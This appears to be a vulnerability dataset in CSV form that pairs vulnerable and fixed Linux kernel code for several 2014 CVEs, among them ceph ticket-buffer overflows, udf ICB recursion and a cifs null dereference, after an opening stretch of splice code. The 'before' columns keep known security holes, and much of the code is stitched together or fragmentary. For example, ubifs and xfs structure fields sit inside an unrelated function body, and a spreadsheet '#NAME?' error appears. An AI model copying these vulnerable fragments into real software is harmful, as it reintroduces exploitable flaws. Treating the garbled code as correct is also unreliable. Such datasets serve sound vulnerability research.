EXPORT_SYMBOL(generic_file_splice_write);

/**
 * iter_file_splice_write - splice data from a pipe to a file
 * @pipe:	pipe info
 * @out:	file to write to
 * @ppos:	position in @out
 * @len:	number of bytes to splice
 * @flags:	splice modifier flags
 *
 * Description:
 *    Will either move or copy pages (determined by @flags options) from
 *    the given pipe inode to the given file.
 *    This one is ->write_iter-based.
 *
 */
ssize_t
iter_file_splice_write(struct pipe_inode_info *pipe, struct file *out,
 loff_t *ppos, size_t len, unsigned int flags)
{
 struct splice_desc sd = {
		.total_len = len,
		.flags = flags,
		.pos = *ppos,
		.u.file = out,
	};
 int nbufs = pipe->buffers;
 struct bio_vec *array = kcalloc(nbufs, sizeof(struct bio_vec),
					GFP_KERNEL);
 ssize_t ret;

 if (unlikely(!array))
 return -ENOMEM;

 pipe_lock(pipe);

 splice_from_pipe_begin(&sd);
 while (sd.total_len) {
 struct iov_iter from;
 struct kiocb kiocb;
 size_t left;
 int n, idx;

		ret = splice_from_pipe_next(pipe, &sd);
 if (ret <= 0)
 break;

 if (unlikely(nbufs < pipe->buffers)) {
 kfree(array);
			nbufs = pipe->buffers;
			array = kcalloc(nbufs, sizeof(struct bio_vec),
					GFP_KERNEL);
 if (!array) {
				ret = -ENOMEM;
 break;
			}
		}

 /* build the vector */
		left = sd.total_len;
 for (n = 0, idx = pipe->curbuf; left && n < pipe->nrbufs; n++, idx++) {
 struct pipe_buffer *buf = pipe->bufs + idx;
 size_t this_len = buf->len;

 if (this_len > left)
				this_len = left;

 if (idx == pipe->buffers - 1)
				idx = -1;

			ret = buf->ops->confirm(pipe, buf);
 if (unlikely(ret)) {
 if (ret == -ENODATA)
					ret = 0;
 goto done;
			}

			array[n].bv_page = buf->page;
			array[n].bv_len = this_len;
			array[n].bv_offset = buf->offset;
			left -= this_len;
		}

 /* ... iov_iter */
		from.type = ITER_BVEC | WRITE;
		from.bvec = array;
		from.nr_segs = n;
		from.count = sd.total_len - left;
		from.iov_offset = 0;

 /* ... and iocb */
 init_sync_kiocb(&kiocb, out);
		kiocb.ki_pos = sd.pos;
		kiocb.ki_nbytes = sd.total_len - left;

 /* now, send it */
		ret = out->f_op->write_iter(&kiocb, &from);
 if (-EIOCBQUEUED == ret)
			ret = wait_on_sync_kiocb(&kiocb);

 if (ret <= 0)
 break;

		sd.num_spliced += ret;
		sd.total_len -= ret;
		*ppos = sd.pos = kiocb.ki_pos;

 /* dismiss the fully eaten buffers, adjust the partial one */
 while (ret) {
 struct pipe_buffer *buf = pipe->bufs + pipe->curbuf;
 if (ret >= buf->len) {
 const struct pipe_buf_operations *ops = buf->ops;
				ret -= buf->len;
				buf->len = 0;
				buf->ops = NULL;
				ops->release(pipe, buf);
 pipe->curbuf = (pipe->curbuf + 1) & (pipe->buffers - 1);
 pipe->nrbufs--;
 if (pipe->files)
					sd.need_wakeup = true;
			} else {
				buf->offset += ret;
				buf->len -= ret;
				ret = 0;
			}
		}
	}
done:
 kfree(array);
 splice_from_pipe_end(pipe, &sd);

 pipe_unlock(pipe);

 if (sd.num_spliced)
		ret = sd.num_spliced;

 return ret;
}

EXPORT_SYMBOL(iter_file_splice_write);

static int write_pipe_buf(struct pipe_inode_info *pipe, struct pipe_buffer *buf,
 struct splice_desc *sd)
{
	.fsync          = ubifs_fsync,
	.unlocked_ioctl = ubifs_ioctl,
	.splice_read	= generic_file_splice_read,
	.splice_write	= iter_file_splice_write,
#ifdef CONFIG_COMPAT
	.compat_ioctl   = ubifs_compat_ioctl,
#endif
 return ret;
}










































/*
 * This routine is called to handle zeroing any space in the last block of the
 * file that is beyond the EOF.  We do this since the size is being increased
	.read_iter	= xfs_file_read_iter,
	.write_iter	= xfs_file_write_iter,
	.splice_read	= xfs_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.unlocked_ioctl	= xfs_file_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl	= xfs_file_compat_ioctl,
DEFINE_RW_EVENT(xfs_file_buffered_write);
DEFINE_RW_EVENT(xfs_file_direct_write);
DEFINE_RW_EVENT(xfs_file_splice_read);


DECLARE_EVENT_CLASS(xfs_page_class,
 TP_PROTO(struct inode *inode, struct page *page, unsigned long off,
 struct pipe_inode_info *, size_t, unsigned int);
extern ssize_t generic_file_splice_write(struct pipe_inode_info *,
 struct file *, loff_t *, size_t, unsigned int);
extern ssize_t iter_file_splice_write(struct pipe_inode_info *,
 struct file *, loff_t *, size_t, unsigned int);
extern ssize_t generic_splice_sendpage(struct pipe_inode_info *pipe,
 struct file *out, loff_t *, size_t len, unsigned int flags);

"
2014,#NAME?,CVE-2014-7284,"bool __net_get_random_once(void *buf, int nbytes, bool *done,
 struct static_key *done_key);

#ifdef HAVE_JUMP_LABEL
#define ___NET_RANDOM_STATIC_KEY_INIT ((struct static_key) \
		{ .enabled = ATOMIC_INIT(0), .entries = (void *)1 })
#else /* !HAVE_JUMP_LABEL */
#define ___NET_RANDOM_STATIC_KEY_INIT STATIC_KEY_INIT_FALSE
#endif /* HAVE_JUMP_LABEL */

#define net_get_random_once(buf, nbytes)				\
	({								\
 bool ___ret = false;					\
 static bool ___done = false;				\
 static struct static_key ___done_key =			\
 ___NET_RANDOM_STATIC_KEY_INIT;			\
 if (!static_key_true(&___done_key))			\
			___ret = __net_get_random_once(buf,		\
						       nbytes,		\
						       &___done,	\
						       &___done_key);	\
		___ret;							\
	})

{
 struct __net_random_once_work *work =
 container_of(w, struct __net_random_once_work, work);
 if (!static_key_enabled(work->key))
  static_key_slow_inc(work->key);
 kfree(work);
}

}

bool __net_get_random_once(void *buf, int nbytes, bool *done,
 struct static_key *done_key)
{
 static DEFINE_SPINLOCK(lock);
 unsigned long flags;
	*done = true;
 spin_unlock_irqrestore(&lock, flags);

 __net_random_once_disable_jump(done_key);

 return true;
}
","bool __net_get_random_once(void *buf, int nbytes, bool *done,
 struct static_key *done_key);








#define net_get_random_once(buf, nbytes)				\
	({								\
 bool ___ret = false;					\
 static bool ___done = false;				\
 static struct static_key ___once_key =			\
 STATIC_KEY_INIT_TRUE;				\
 if (static_key_true(&___once_key))			\
			___ret = __net_get_random_once(buf,		\
						       nbytes,		\
						       &___done,	\
						       &___once_key);	\
		___ret;							\
	})

{
 struct __net_random_once_work *work =
 container_of(w, struct __net_random_once_work, work);
 BUG_ON(!static_key_enabled(work->key));
 static_key_slow_dec(work->key);
 kfree(work);
}

}

bool __net_get_random_once(void *buf, int nbytes, bool *done,
 struct static_key *once_key)
{
 static DEFINE_SPINLOCK(lock);
 unsigned long flags;
	*done = true;
 spin_unlock_irqrestore(&lock, flags);

 __net_random_once_disable_jump(once_key);

 return true;
}
"
2014,DoS ,CVE-2014-7283,"		node = blk->bp->b_addr;
		dp->d_ops->node_hdr_from_disk(&nodehdr, node);
		btree = dp->d_ops->node_tree_p(node);
 if (be32_to_cpu(btree->hashval) == lasthash)
 break;
		blk->hashval = lasthash;
		btree[blk->index].hashval = cpu_to_be32(lasthash);
","		node = blk->bp->b_addr;
		dp->d_ops->node_hdr_from_disk(&nodehdr, node);
		btree = dp->d_ops->node_tree_p(node);
 if (be32_to_cpu(btree[blk->index].hashval) == lasthash)
 break;
		blk->hashval = lasthash;
		btree[blk->index].hashval = cpu_to_be32(lasthash);
"
2014,DoS ,CVE-2014-7207,,
2014,DoS ,CVE-2014-7145,"tcon_error_exit:
 if (rsp->hdr.Status == STATUS_BAD_NETWORK_NAME) {
 cifs_dbg(VFS, ""BAD_NETWORK_NAME: %s\n"", tree);
		tcon->bad_network_name = true;

	}
 goto tcon_exit;
}
","tcon_error_exit:
 if (rsp->hdr.Status == STATUS_BAD_NETWORK_NAME) {
 cifs_dbg(VFS, ""BAD_NETWORK_NAME: %s\n"", tree);
 if (tcon)
			tcon->bad_network_name = true;
	}
 goto tcon_exit;
}
"
2014,DoS ,CVE-2014-6418,"#include ""auth_x.h""
#include ""auth_x_protocol.h""

#define TEMP_TICKET_BUF_LEN 256

static void ceph_x_validate_tickets(struct ceph_auth_client *ac, int *pneed);

static int ceph_x_is_authenticated(struct ceph_auth_client *ac)
}

static int ceph_x_decrypt(struct ceph_crypto_key *secret,
 void **p, void *end, void *obuf, size_t olen)
{
 struct ceph_x_encrypt_header head;
 size_t head_len = sizeof(head);
 return -EINVAL;

 dout(""ceph_x_decrypt len %d\n"", len);
	ret = ceph_decrypt2(secret, &head, &head_len, obuf, &olen,
			    *p, len);






 if (ret)
 return ret;
 if (head.struct_v != 1 || le64_to_cpu(head.magic) != CEPHX_ENC_MAGIC)

static int process_one_ticket(struct ceph_auth_client *ac,
 struct ceph_crypto_key *secret,
 void **p, void *end,
 void *dbuf, void *ticket_buf)
{
 struct ceph_x_info *xi = ac->private;
 int type;
	u8 tkt_struct_v, blob_struct_v;
 struct ceph_x_ticket_handler *th;

 void *dp, *dend;
 int dlen;
 char is_enc;
 struct timespec validity;
 struct ceph_crypto_key old_key;

 void *tp, *tpend;
 struct ceph_timespec new_validity;
 struct ceph_crypto_key new_session_key;
	}

 /* blob for me */
	dlen = ceph_x_decrypt(secret, p, end, dbuf,
			      TEMP_TICKET_BUF_LEN);
 if (dlen <= 0) {
		ret = dlen;
 goto out;

 /* ticket blob for service */
 ceph_decode_8_safe(p, end, is_enc, bad);
	tp = ticket_buf;
 if (is_enc) {
 /* encrypted */
 dout("" encrypted ticket\n"");
		dlen = ceph_x_decrypt(&old_key, p, end, ticket_buf,
				      TEMP_TICKET_BUF_LEN);
 if (dlen < 0) {
			ret = dlen;
 goto out;
		}

		dlen = ceph_decode_32(&tp);
	} else {
 /* unencrypted */
 ceph_decode_32_safe(p, end, dlen, bad);






 ceph_decode_need(p, end, dlen, bad);
 ceph_decode_copy(p, ticket_buf, dlen);
	}
	xi->have_keys |= th->service;

out:


 return ret;

bad:
 void *buf, void *end)
{
 void *p = buf;
 char *dbuf;
 char *ticket_buf;
	u8 reply_struct_v;
	u32 num;
 int ret;

	dbuf = kmalloc(TEMP_TICKET_BUF_LEN, GFP_NOFS);
 if (!dbuf)
 return -ENOMEM;

	ret = -ENOMEM;
	ticket_buf = kmalloc(TEMP_TICKET_BUF_LEN, GFP_NOFS);
 if (!ticket_buf)
 goto out_dbuf;

 ceph_decode_8_safe(&p, end, reply_struct_v, bad);
 if (reply_struct_v != 1)
 return -EINVAL;
 dout(""%d tickets\n"", num);

 while (num--) {
		ret = process_one_ticket(ac, secret, &p, end,
					 dbuf, ticket_buf);
 if (ret)
 goto out;
	}

	ret = 0;
out:
 kfree(ticket_buf);
out_dbuf:
 kfree(dbuf);
 return ret;

bad:
	ret = -EINVAL;
 goto out;
}

static int ceph_x_build_authorizer(struct ceph_auth_client *ac,
 struct ceph_x_ticket_handler *th;
 int ret = 0;
 struct ceph_x_authorize_reply reply;

 void *p = au->reply_buf;
 void *end = p + sizeof(au->reply_buf);

	th = get_ticket_handler(ac, au->service);
 if (IS_ERR(th))
 return PTR_ERR(th);
	ret = ceph_x_decrypt(&th->session_key, &p, end, &reply, sizeof(reply));
 if (ret < 0)
 return ret;
 if (ret != sizeof(reply))
","#include ""auth_x.h""
#include ""auth_x_protocol.h""



static void ceph_x_validate_tickets(struct ceph_auth_client *ac, int *pneed);

static int ceph_x_is_authenticated(struct ceph_auth_client *ac)
}

static int ceph_x_decrypt(struct ceph_crypto_key *secret,
 void **p, void *end, void **obuf, size_t olen)
{
 struct ceph_x_encrypt_header head;
 size_t head_len = sizeof(head);
 return -EINVAL;

 dout(""ceph_x_decrypt len %d\n"", len);
 if (*obuf == NULL) {
		*obuf = kmalloc(len, GFP_NOFS);
 if (!*obuf)
 return -ENOMEM;
		olen = len;
	}

	ret = ceph_decrypt2(secret, &head, &head_len, *obuf, &olen, *p, len);
 if (ret)
 return ret;
 if (head.struct_v != 1 || le64_to_cpu(head.magic) != CEPHX_ENC_MAGIC)

static int process_one_ticket(struct ceph_auth_client *ac,
 struct ceph_crypto_key *secret,
 void **p, void *end)

{
 struct ceph_x_info *xi = ac->private;
 int type;
	u8 tkt_struct_v, blob_struct_v;
 struct ceph_x_ticket_handler *th;
 void *dbuf = NULL;
 void *dp, *dend;
 int dlen;
 char is_enc;
 struct timespec validity;
 struct ceph_crypto_key old_key;
 void *ticket_buf = NULL;
 void *tp, *tpend;
 struct ceph_timespec new_validity;
 struct ceph_crypto_key new_session_key;
	}

 /* blob for me */
	dlen = ceph_x_decrypt(secret, p, end, &dbuf, 0);

 if (dlen <= 0) {
		ret = dlen;
 goto out;

 /* ticket blob for service */
 ceph_decode_8_safe(p, end, is_enc, bad);

 if (is_enc) {
 /* encrypted */
 dout("" encrypted ticket\n"");
		dlen = ceph_x_decrypt(&old_key, p, end, &ticket_buf, 0);

 if (dlen < 0) {
			ret = dlen;
 goto out;
		}
		tp = ticket_buf;
		dlen = ceph_decode_32(&tp);
	} else {
 /* unencrypted */
 ceph_decode_32_safe(p, end, dlen, bad);
		ticket_buf = kmalloc(dlen, GFP_NOFS);
 if (!ticket_buf) {
			ret = -ENOMEM;
 goto out;
		}
		tp = ticket_buf;
 ceph_decode_need(p, end, dlen, bad);
 ceph_decode_copy(p, ticket_buf, dlen);
	}
	xi->have_keys |= th->service;

out:
 kfree(ticket_buf);
 kfree(dbuf);
 return ret;

bad:
 void *buf, void *end)
{
 void *p = buf;


	u8 reply_struct_v;
	u32 num;
 int ret;










 ceph_decode_8_safe(&p, end, reply_struct_v, bad);
 if (reply_struct_v != 1)
 return -EINVAL;
 dout(""%d tickets\n"", num);

 while (num--) {
		ret = process_one_ticket(ac, secret, &p, end);

 if (ret)
 return ret;
	}

 return 0;






bad:
 return -EINVAL;

}

static int ceph_x_build_authorizer(struct ceph_auth_client *ac,
 struct ceph_x_ticket_handler *th;
 int ret = 0;
 struct ceph_x_authorize_reply reply;
 void *preply = &reply;
 void *p = au->reply_buf;
 void *end = p + sizeof(au->reply_buf);

	th = get_ticket_handler(ac, au->service);
 if (IS_ERR(th))
 return PTR_ERR(th);
	ret = ceph_x_decrypt(&th->session_key, &p, end, &preply, sizeof(reply));
 if (ret < 0)
 return ret;
 if (ret != sizeof(reply))
"
2014,DoS ,CVE-2014-6417,"#include ""auth_x.h""
#include ""auth_x_protocol.h""

#define TEMP_TICKET_BUF_LEN 256

static void ceph_x_validate_tickets(struct ceph_auth_client *ac, int *pneed);

static int ceph_x_is_authenticated(struct ceph_auth_client *ac)
}

static int ceph_x_decrypt(struct ceph_crypto_key *secret,
 void **p, void *end, void *obuf, size_t olen)
{
 struct ceph_x_encrypt_header head;
 size_t head_len = sizeof(head);
 return -EINVAL;

 dout(""ceph_x_decrypt len %d\n"", len);
	ret = ceph_decrypt2(secret, &head, &head_len, obuf, &olen,
			    *p, len);






 if (ret)
 return ret;
 if (head.struct_v != 1 || le64_to_cpu(head.magic) != CEPHX_ENC_MAGIC)

static int process_one_ticket(struct ceph_auth_client *ac,
 struct ceph_crypto_key *secret,
 void **p, void *end,
 void *dbuf, void *ticket_buf)
{
 struct ceph_x_info *xi = ac->private;
 int type;
	u8 tkt_struct_v, blob_struct_v;
 struct ceph_x_ticket_handler *th;

 void *dp, *dend;
 int dlen;
 char is_enc;
 struct timespec validity;
 struct ceph_crypto_key old_key;

 void *tp, *tpend;
 struct ceph_timespec new_validity;
 struct ceph_crypto_key new_session_key;
	}

 /* blob for me */
	dlen = ceph_x_decrypt(secret, p, end, dbuf,
			      TEMP_TICKET_BUF_LEN);
 if (dlen <= 0) {
		ret = dlen;
 goto out;

 /* ticket blob for service */
 ceph_decode_8_safe(p, end, is_enc, bad);
	tp = ticket_buf;
 if (is_enc) {
 /* encrypted */
 dout("" encrypted ticket\n"");
		dlen = ceph_x_decrypt(&old_key, p, end, ticket_buf,
				      TEMP_TICKET_BUF_LEN);
 if (dlen < 0) {
			ret = dlen;
 goto out;
		}

		dlen = ceph_decode_32(&tp);
	} else {
 /* unencrypted */
 ceph_decode_32_safe(p, end, dlen, bad);






 ceph_decode_need(p, end, dlen, bad);
 ceph_decode_copy(p, ticket_buf, dlen);
	}
	xi->have_keys |= th->service;

out:


 return ret;

bad:
 void *buf, void *end)
{
 void *p = buf;
 char *dbuf;
 char *ticket_buf;
	u8 reply_struct_v;
	u32 num;
 int ret;

	dbuf = kmalloc(TEMP_TICKET_BUF_LEN, GFP_NOFS);
 if (!dbuf)
 return -ENOMEM;

	ret = -ENOMEM;
	ticket_buf = kmalloc(TEMP_TICKET_BUF_LEN, GFP_NOFS);
 if (!ticket_buf)
 goto out_dbuf;

 ceph_decode_8_safe(&p, end, reply_struct_v, bad);
 if (reply_struct_v != 1)
 return -EINVAL;
 dout(""%d tickets\n"", num);

 while (num--) {
		ret = process_one_ticket(ac, secret, &p, end,
					 dbuf, ticket_buf);
 if (ret)
 goto out;
	}

	ret = 0;
out:
 kfree(ticket_buf);
out_dbuf:
 kfree(dbuf);
 return ret;

bad:
	ret = -EINVAL;
 goto out;
}

static int ceph_x_build_authorizer(struct ceph_auth_client *ac,
 struct ceph_x_ticket_handler *th;
 int ret = 0;
 struct ceph_x_authorize_reply reply;

 void *p = au->reply_buf;
 void *end = p + sizeof(au->reply_buf);

	th = get_ticket_handler(ac, au->service);
 if (IS_ERR(th))
 return PTR_ERR(th);
	ret = ceph_x_decrypt(&th->session_key, &p, end, &reply, sizeof(reply));
 if (ret < 0)
 return ret;
 if (ret != sizeof(reply))
","#include ""auth_x.h""
#include ""auth_x_protocol.h""



static void ceph_x_validate_tickets(struct ceph_auth_client *ac, int *pneed);

static int ceph_x_is_authenticated(struct ceph_auth_client *ac)
}

static int ceph_x_decrypt(struct ceph_crypto_key *secret,
 void **p, void *end, void **obuf, size_t olen)
{
 struct ceph_x_encrypt_header head;
 size_t head_len = sizeof(head);
 return -EINVAL;

 dout(""ceph_x_decrypt len %d\n"", len);
 if (*obuf == NULL) {
		*obuf = kmalloc(len, GFP_NOFS);
 if (!*obuf)
 return -ENOMEM;
		olen = len;
	}

	ret = ceph_decrypt2(secret, &head, &head_len, *obuf, &olen, *p, len);
 if (ret)
 return ret;
 if (head.struct_v != 1 || le64_to_cpu(head.magic) != CEPHX_ENC_MAGIC)

static int process_one_ticket(struct ceph_auth_client *ac,
 struct ceph_crypto_key *secret,
 void **p, void *end)

{
 struct ceph_x_info *xi = ac->private;
 int type;
	u8 tkt_struct_v, blob_struct_v;
 struct ceph_x_ticket_handler *th;
 void *dbuf = NULL;
 void *dp, *dend;
 int dlen;
 char is_enc;
 struct timespec validity;
 struct ceph_crypto_key old_key;
 void *ticket_buf = NULL;
 void *tp, *tpend;
 struct ceph_timespec new_validity;
 struct ceph_crypto_key new_session_key;
	}

 /* blob for me */
	dlen = ceph_x_decrypt(secret, p, end, &dbuf, 0);

 if (dlen <= 0) {
		ret = dlen;
 goto out;

 /* ticket blob for service */
 ceph_decode_8_safe(p, end, is_enc, bad);

 if (is_enc) {
 /* encrypted */
 dout("" encrypted ticket\n"");
		dlen = ceph_x_decrypt(&old_key, p, end, &ticket_buf, 0);

 if (dlen < 0) {
			ret = dlen;
 goto out;
		}
		tp = ticket_buf;
		dlen = ceph_decode_32(&tp);
	} else {
 /* unencrypted */
 ceph_decode_32_safe(p, end, dlen, bad);
		ticket_buf = kmalloc(dlen, GFP_NOFS);
 if (!ticket_buf) {
			ret = -ENOMEM;
 goto out;
		}
		tp = ticket_buf;
 ceph_decode_need(p, end, dlen, bad);
 ceph_decode_copy(p, ticket_buf, dlen);
	}
	xi->have_keys |= th->service;

out:
 kfree(ticket_buf);
 kfree(dbuf);
 return ret;

bad:
 void *buf, void *end)
{
 void *p = buf;


	u8 reply_struct_v;
	u32 num;
 int ret;










 ceph_decode_8_safe(&p, end, reply_struct_v, bad);
 if (reply_struct_v != 1)
 return -EINVAL;
 dout(""%d tickets\n"", num);

 while (num--) {
		ret = process_one_ticket(ac, secret, &p, end);

 if (ret)
 return ret;
	}

 return 0;






bad:
 return -EINVAL;

}

static int ceph_x_build_authorizer(struct ceph_auth_client *ac,
 struct ceph_x_ticket_handler *th;
 int ret = 0;
 struct ceph_x_authorize_reply reply;
 void *preply = &reply;
 void *p = au->reply_buf;
 void *end = p + sizeof(au->reply_buf);

	th = get_ticket_handler(ac, au->service);
 if (IS_ERR(th))
 return PTR_ERR(th);
	ret = ceph_x_decrypt(&th->session_key, &p, end, &preply, sizeof(reply));
 if (ret < 0)
 return ret;
 if (ret != sizeof(reply))
"
2014,DoS Overflow Mem. Corr. ,CVE-2014-6416,"#include ""auth_x.h""
#include ""auth_x_protocol.h""

#define TEMP_TICKET_BUF_LEN 256

static void ceph_x_validate_tickets(struct ceph_auth_client *ac, int *pneed);

static int ceph_x_is_authenticated(struct ceph_auth_client *ac)
}

static int ceph_x_decrypt(struct ceph_crypto_key *secret,
 void **p, void *end, void *obuf, size_t olen)
{
 struct ceph_x_encrypt_header head;
 size_t head_len = sizeof(head);
 return -EINVAL;

 dout(""ceph_x_decrypt len %d\n"", len);
	ret = ceph_decrypt2(secret, &head, &head_len, obuf, &olen,
			    *p, len);






 if (ret)
 return ret;
 if (head.struct_v != 1 || le64_to_cpu(head.magic) != CEPHX_ENC_MAGIC)

static int process_one_ticket(struct ceph_auth_client *ac,
 struct ceph_crypto_key *secret,
 void **p, void *end,
 void *dbuf, void *ticket_buf)
{
 struct ceph_x_info *xi = ac->private;
 int type;
	u8 tkt_struct_v, blob_struct_v;
 struct ceph_x_ticket_handler *th;

 void *dp, *dend;
 int dlen;
 char is_enc;
 struct timespec validity;
 struct ceph_crypto_key old_key;

 void *tp, *tpend;
 struct ceph_timespec new_validity;
 struct ceph_crypto_key new_session_key;
	}

 /* blob for me */
	dlen = ceph_x_decrypt(secret, p, end, dbuf,
			      TEMP_TICKET_BUF_LEN);
 if (dlen <= 0) {
		ret = dlen;
 goto out;

 /* ticket blob for service */
 ceph_decode_8_safe(p, end, is_enc, bad);
	tp = ticket_buf;
 if (is_enc) {
 /* encrypted */
 dout("" encrypted ticket\n"");
		dlen = ceph_x_decrypt(&old_key, p, end, ticket_buf,
				      TEMP_TICKET_BUF_LEN);
 if (dlen < 0) {
			ret = dlen;
 goto out;
		}

		dlen = ceph_decode_32(&tp);
	} else {
 /* unencrypted */
 ceph_decode_32_safe(p, end, dlen, bad);






 ceph_decode_need(p, end, dlen, bad);
 ceph_decode_copy(p, ticket_buf, dlen);
	}
	xi->have_keys |= th->service;

out:


 return ret;

bad:
 void *buf, void *end)
{
 void *p = buf;
 char *dbuf;
 char *ticket_buf;
	u8 reply_struct_v;
	u32 num;
 int ret;

	dbuf = kmalloc(TEMP_TICKET_BUF_LEN, GFP_NOFS);
 if (!dbuf)
 return -ENOMEM;

	ret = -ENOMEM;
	ticket_buf = kmalloc(TEMP_TICKET_BUF_LEN, GFP_NOFS);
 if (!ticket_buf)
 goto out_dbuf;

 ceph_decode_8_safe(&p, end, reply_struct_v, bad);
 if (reply_struct_v != 1)
 return -EINVAL;
 dout(""%d tickets\n"", num);

 while (num--) {
		ret = process_one_ticket(ac, secret, &p, end,
					 dbuf, ticket_buf);
 if (ret)
 goto out;
	}

	ret = 0;
out:
 kfree(ticket_buf);
out_dbuf:
 kfree(dbuf);
 return ret;

bad:
	ret = -EINVAL;
 goto out;
}

static int ceph_x_build_authorizer(struct ceph_auth_client *ac,
 struct ceph_x_ticket_handler *th;
 int ret = 0;
 struct ceph_x_authorize_reply reply;

 void *p = au->reply_buf;
 void *end = p + sizeof(au->reply_buf);

	th = get_ticket_handler(ac, au->service);
 if (IS_ERR(th))
 return PTR_ERR(th);
	ret = ceph_x_decrypt(&th->session_key, &p, end, &reply, sizeof(reply));
 if (ret < 0)
 return ret;
 if (ret != sizeof(reply))
","#include ""auth_x.h""
#include ""auth_x_protocol.h""



static void ceph_x_validate_tickets(struct ceph_auth_client *ac, int *pneed);

static int ceph_x_is_authenticated(struct ceph_auth_client *ac)
}

static int ceph_x_decrypt(struct ceph_crypto_key *secret,
 void **p, void *end, void **obuf, size_t olen)
{
 struct ceph_x_encrypt_header head;
 size_t head_len = sizeof(head);
 return -EINVAL;

 dout(""ceph_x_decrypt len %d\n"", len);
 if (*obuf == NULL) {
		*obuf = kmalloc(len, GFP_NOFS);
 if (!*obuf)
 return -ENOMEM;
		olen = len;
	}

	ret = ceph_decrypt2(secret, &head, &head_len, *obuf, &olen, *p, len);
 if (ret)
 return ret;
 if (head.struct_v != 1 || le64_to_cpu(head.magic) != CEPHX_ENC_MAGIC)

static int process_one_ticket(struct ceph_auth_client *ac,
 struct ceph_crypto_key *secret,
 void **p, void *end)

{
 struct ceph_x_info *xi = ac->private;
 int type;
	u8 tkt_struct_v, blob_struct_v;
 struct ceph_x_ticket_handler *th;
 void *dbuf = NULL;
 void *dp, *dend;
 int dlen;
 char is_enc;
 struct timespec validity;
 struct ceph_crypto_key old_key;
 void *ticket_buf = NULL;
 void *tp, *tpend;
 struct ceph_timespec new_validity;
 struct ceph_crypto_key new_session_key;
	}

 /* blob for me */
	dlen = ceph_x_decrypt(secret, p, end, &dbuf, 0);

 if (dlen <= 0) {
		ret = dlen;
 goto out;

 /* ticket blob for service */
 ceph_decode_8_safe(p, end, is_enc, bad);

 if (is_enc) {
 /* encrypted */
 dout("" encrypted ticket\n"");
		dlen = ceph_x_decrypt(&old_key, p, end, &ticket_buf, 0);

 if (dlen < 0) {
			ret = dlen;
 goto out;
		}
		tp = ticket_buf;
		dlen = ceph_decode_32(&tp);
	} else {
 /* unencrypted */
 ceph_decode_32_safe(p, end, dlen, bad);
		ticket_buf = kmalloc(dlen, GFP_NOFS);
 if (!ticket_buf) {
			ret = -ENOMEM;
 goto out;
		}
		tp = ticket_buf;
 ceph_decode_need(p, end, dlen, bad);
 ceph_decode_copy(p, ticket_buf, dlen);
	}
	xi->have_keys |= th->service;

out:
 kfree(ticket_buf);
 kfree(dbuf);
 return ret;

bad:
 void *buf, void *end)
{
 void *p = buf;


	u8 reply_struct_v;
	u32 num;
 int ret;










 ceph_decode_8_safe(&p, end, reply_struct_v, bad);
 if (reply_struct_v != 1)
 return -EINVAL;
 dout(""%d tickets\n"", num);

 while (num--) {
		ret = process_one_ticket(ac, secret, &p, end);

 if (ret)
 return ret;
	}

 return 0;






bad:
 return -EINVAL;

}

static int ceph_x_build_authorizer(struct ceph_auth_client *ac,
 struct ceph_x_ticket_handler *th;
 int ret = 0;
 struct ceph_x_authorize_reply reply;
 void *preply = &reply;
 void *p = au->reply_buf;
 void *end = p + sizeof(au->reply_buf);

	th = get_ticket_handler(ac, au->service);
 if (IS_ERR(th))
 return PTR_ERR(th);
	ret = ceph_x_decrypt(&th->session_key, &p, end, &preply, sizeof(reply));
 if (ret < 0)
 return ret;
 if (ret != sizeof(reply))
"
2014,DoS ,CVE-2014-6410," return 0;
}








static void __udf_read_inode(struct inode *inode)
{
 struct buffer_head *bh = NULL;
 struct udf_inode_info *iinfo = UDF_I(inode);
 struct udf_sb_info *sbi = UDF_SB(inode->i_sb);
 unsigned int link_count;



 /*
	 * Set defaults, but the inode is still incomplete!
	 * Note: get_new_inode() sets the following on a new inode:
		ibh = udf_read_ptagged(inode->i_sb, &iinfo->i_location, 1,
					&ident);
 if (ident == TAG_IDENT_IE && ibh) {
 struct buffer_head *nbh = NULL;
 struct kernel_lb_addr loc;
 struct indirectEntry *ie;

			ie = (struct indirectEntry *)ibh->b_data;
			loc = lelb_to_cpu(ie->indirectICB.extLocation);

 if (ie->indirectICB.extLength &&
				(nbh = udf_read_ptagged(inode->i_sb, &loc, 0,
							&ident))) {
 if (ident == TAG_IDENT_FE ||
					ident == TAG_IDENT_EFE) {
 memcpy(&iinfo->i_location,
						&loc,
 sizeof(struct kernel_lb_addr));
 brelse(bh);
 brelse(ibh);
 brelse(nbh);
 __udf_read_inode(inode);
 return;
				}
 brelse(nbh);
			}
		}
 brelse(ibh);
"," return 0;
}

/*
 * Maximum length of linked list formed by ICB hierarchy. The chosen number is
 * arbitrary - just that we hopefully don't limit any real use of rewritten
 * inode on write-once media but avoid looping for too long on corrupted media.
 */
#define UDF_MAX_ICB_NESTING 1024

static void __udf_read_inode(struct inode *inode)
{
 struct buffer_head *bh = NULL;
 struct udf_inode_info *iinfo = UDF_I(inode);
 struct udf_sb_info *sbi = UDF_SB(inode->i_sb);
 unsigned int link_count;
 unsigned int indirections = 0;

reread:
 /*
	 * Set defaults, but the inode is still incomplete!
	 * Note: get_new_inode() sets the following on a new inode:
		ibh = udf_read_ptagged(inode->i_sb, &iinfo->i_location, 1,
					&ident);
 if (ident == TAG_IDENT_IE && ibh) {

 struct kernel_lb_addr loc;
 struct indirectEntry *ie;

			ie = (struct indirectEntry *)ibh->b_data;
			loc = lelb_to_cpu(ie->indirectICB.extLocation);

 if (ie->indirectICB.extLength) {
 brelse(bh);
 brelse(ibh);
 memcpy(&iinfo->i_location, &loc,
 sizeof(struct kernel_lb_addr));
 if (++indirections > UDF_MAX_ICB_NESTING) {
 udf_err(inode->i_sb,
 ""too many ICBs in ICB hierarchy""
 "" (max %d supported)\n"",
						UDF_MAX_ICB_NESTING);
 make_bad_inode(inode);

 return;
				}
 goto reread;
			}
		}
 brelse(ibh);
"
2014,DoS ,CVE-2014-5472," return;
}

static int isofs_read_inode(struct inode *);
static int isofs_statfs (struct dentry *, struct kstatfs *);

static struct kmem_cache *isofs_inode_cachep;
 goto out;
}

static int isofs_read_inode(struct inode *inode)
{
 struct super_block *sb = inode->i_sb;
 struct isofs_sb_info *sbi = ISOFS_SB(sb);
 */

 if (!high_sierra) {
 parse_rock_ridge_inode(de, inode);
 /* if we want uid/gid set, override the rock ridge setting */
 if (sbi->s_uid_set)
			inode->i_uid = sbi->s_uid;
 * offset that point to the underlying meta-data for the inode.  The
 * code below is otherwise similar to the iget() code in
 * include/linux/fs.h */
